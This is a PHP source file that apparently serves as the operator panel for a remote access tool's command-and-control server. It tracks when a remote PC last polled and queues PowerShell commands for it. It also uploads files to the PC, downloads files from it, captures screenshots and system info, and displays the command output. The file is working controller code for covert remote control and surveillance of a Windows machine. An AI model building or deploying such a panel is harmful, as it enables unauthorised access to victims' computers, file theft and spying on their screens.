<?php

if (file_exists('plugins/pc_info.txt'))
	$pc_info = htmlspecialchars(file_get_contents('plugins/pc_info.txt'));
if (file_exists('plugins/screenshot.txt'))
	$screenshot = htmlspecialchars(file_get_contents('plugins/screenshot.txt'));

$actual_date = date("Y-m-d H:i:s");
$req_time = file_get_contents("LASTREQUEST.txt");
$diff = abs(strtotime($actual_date) - strtotime($req_time));

$days = floor($diff/(24*3600));
$hours = floor($diff%(24*3600)/3600);
$minutes = floor($diff%3600/60);
$seconds = floor($diff%60);

$FINAL = $seconds . " SECONDS ";
if($diff>60)
	$FINAL .= $minutes . " MINUTES ";
if($diff>3600)
	$FINAL .= $hours . " HOURS ";
if($diff>3600*24)
	$FINAL .= $days . " DAYS ";

$settings = file("settings.config");
$check_command_time = (int) $settings[3];
$on = ($diff < ($check_command_time+10));

echo "<html>
	<head>
	<link type=\"text/css\" rel=\"stylesheet\" href=\"css/materialize.css\" media\"screen,projection\"/>
	<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"/>

	<style>
		body {margin: 30; background-color: #E0E0E0;}
		h3 {font-weight: 500; font-size: 1.50rem; color: #616161; margin: 0.9466666667rem 0 0.168rem 0;}
		h5 {font-weight: 350; font-size: 1.3rem; color: #616161;}
		.btn {padding: 0 25px; margin: 5;}
		textarea.materialize-textarea {}
		input {}
		p {}
		.card-panel {padding: 2px;}
		.card-image{margin: 50;}
	</style>

	</head>
		<body>";
		$FILE = "command.txt";
		if ($on) {
			echo "
				<div class=\"card horizontal  col m4\">
					<div class=\"card-image\">
						<img src=\"images/online.png\" height=\"30\" width=\"30\">
					</div>
					<div class=\"card-stacked\">
						<div class=\"card-content\">
							<h5>ONLINE</h5>
							<h5>CHECKED FOR COMMAND: $FINAL AGO</h5>
						</div>
					</div>
				</div>";
		}
		else {
			echo "
				<div class=\"card horizontal  col m4\">
					<div class=\"card-image\">
						<img src=\"images/offline.png\" height=\"30\" width=\"30\">
					</div>
					<div class=\"card-stacked\">
						<div class=\"card-content\">
							<h5>OFFLINE</h5>
							<h5>LAST SEEN: $FINAL AGO</h5>
						</div>
					</div>
				</div>";
		}
		if (file_exists($FILE)) {
			$READ_FILE = file_get_contents($FILE);
			echo "<h3>Command in queue: $READ_FILE</h3>
				  <form action=\"transfer.php\" method=\"POST\"> 
				  <button class=\"btn waves-effect grey darken-2\" type=\"submit\" name=\"Delete\" value=\"1\">
					Delete command in queue
				  </button>
				  </form>
				  ";
		}
		else
			echo "<h3>No command in queue.</h3>";

echo "	<br>

		<form class=\"col s12\" action=\"transfer.php\" method=\"POST\"> 
			<h5>COMMAND TO SEND: </h5>
			<input autocomplete=\"off\" type=\"text\" name=\"SendPSCommand\">
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\" name=\"action\">
				Submit
			</button>
		</form>

		<h3>UPLOAD -> Uploads file to PC.<h3>
		<h3>DOWNLOAD FILENAME -> Downloads FILENAME to Server.</h3>
		<h3>UPDATE -> Updates settings file on PC.</h3>

		<br>
		<h5>FILE UPLOAD: </h5>
		<div class \"row\">
			<div class=\"grey darken-2\">
				<div class=\"card-panel\">
					<form method=\"POST\" action=\"upload.php\" enctype=\"multipart/form-data\">
						<div class=\"file-field input-field\">
							<div  class=\"btn grey darken-2\">
								<span>FILE</span>
								<input type=\"file\" name=\"uploadedFile\"/> 
							</div>
							<div class=\"file-path-wrapper\">
								<input type=\"text\" class=\"file-path\"  placeholder=\"Choose the file to upload\">
							</div>
						</div>
						<input type=\"submit\" name=\"uploadBtn\" value=\"Upload\" class=\"btn right grey darken-2\">
						<div class=\"clearfix\"></div>
					</form>
				</div>
			</div>
		</div>

		<form class=\"col s12\" action=\"transfer.php\" method=\"POST\">
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\" name=\"SendPSCommand\" value=\"UPLOAD\">
				UPLOAD FILE TO PC
			</button>
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\" name=\"SendPSCommand\" value=\"UPDATE\">
				UPDATE CONFIG FILE
			</button>
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\" name=\"SendPSCommand\" value=\"$pc_info\">
				GET PC INFO
			</button>
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\" name=\"SendPSCommand\" value=\"$screenshot\">
				SCREENSHOT
			</button>
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\" name=\"DEL_SCREENSHOT\" value=\"1\">
				DELETE SCREENSHOT
			</button>

		</form>
		</br>

		<div class=\"row\">
		<form class=\"col s5\" action=\"transfer.php\" method=\"GET\"> 
			<h5>THREAD TIME (seconds)</h5>
			<input autocomplete=\"off\" type=\"text\" name=\"save_thread_time\">
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\">
				SAVE
			</button>
		</form>
		<form class=\"col s5\" action=\"transfer.php\" method=\"GET\"> 
		<h5>CHECK COMMAND TIME (seconds)</h5>
			<input autocomplete=\"off\" type=\"text\" name=\"save_check_command_time\">
			<button class=\"btn waves-effect grey darken-2 \" type=\"submit\">
				SAVE
			</button>
		</form>
		</div>

		";
if (file_exists('downloads/ScreenCapture.png'))
		echo "<img class=\"materiaboxed\" width = \"1280\" align=\"center\" src=\"downloads/ScreenCapture.png\"> ";
		ini_set("auto_detect_line_endings", true);
		$FILE_RESULT = "PS_Result.txt";
		if (file_exists($FILE_RESULT)) {
			$TIME = date("F d Y H:i:s", filemtime($FILE_RESULT));
			echo " <h3>Result from PowerShell (Executed on $TIME) : </h3>";
			$READ_FILE_RESULT = file_get_contents($FILE_RESULT);
			$READ_FILE_RESULT = str_replace("\n", "<br>", $READ_FILE_RESULT);
			$READ_FILE_RESULT = str_replace(" ", "&nbsp", $READ_FILE_RESULT);
			echo "<p style=\"font-family: consolas;\">$READ_FILE_RESULT </p>";
		}
		else
			echo "<h3>No results.</h3>";
echo  "	<script type=\"text/javascript\" src=\"js/materialize.min.js\"></script>
		</body>
	   </html>";

?>